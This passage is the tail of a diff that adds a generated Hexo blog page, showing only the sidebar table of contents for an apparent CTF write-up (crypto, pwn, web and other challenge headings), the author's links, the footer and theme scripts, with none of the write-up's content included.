+      <i class="fa fa-chevron-left"></i> Make a Music Game 101
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome"><span class="nav-number">1.</span> <span class="nav-text">Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SC"><span class="nav-number">2.1.</span> <span class="nav-text">SC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fast-Cipher"><span class="nav-number">2.2.</span> <span class="nav-text">Fast Cipher</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Excel"><span class="nav-number">3.1.</span> <span class="nav-text">Excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gift-in-the-dream"><span class="nav-number">3.2.</span> <span class="nav-text">Gift in the dream</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SAAS-Crash"><span class="nav-number">4.1.</span> <span class="nav-text">SAAS - Crash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bof2Win"><span class="nav-number">4.2.</span> <span class="nav-text">Bof2Win</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">5.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Time-Management"><span class="nav-number">5.1.</span> <span class="nav-text">Time Management</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">6.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Poking-Bear"><span class="nav-number">6.1.</span> <span class="nav-text">Poking Bear</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple-File-Uploader"><span class="nav-number">6.2.</span> <span class="nav-text">Simple File Uploader</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%83%E5%BE%97"><span class="nav-number">7.</span> <span class="nav-text">心得(?</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">onion chen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">標籤</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/onion0905" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;onion0905" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/onion2005" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;onion2005" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>FB Page</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://instagram.com/onion0905" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;onion0905" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">onion chen</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 強力驅動
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
